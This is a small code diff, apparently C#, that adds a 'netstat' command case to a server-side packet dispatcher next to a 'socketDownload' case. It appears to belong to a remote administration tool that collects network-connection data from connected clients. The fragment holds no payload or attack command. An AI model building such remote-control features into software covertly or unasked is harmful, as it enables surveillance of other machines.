@@ -84,6 +84,11 @@ namespace Server.Handle_Packet
                                 break;
                             }
 
+                        case "netstat":
+                            {
+                                new HandleNetstat().GetProcess(client, unpack_msgpack);
+                                break;
+                            }
 
                         case "socketDownload":
                             {
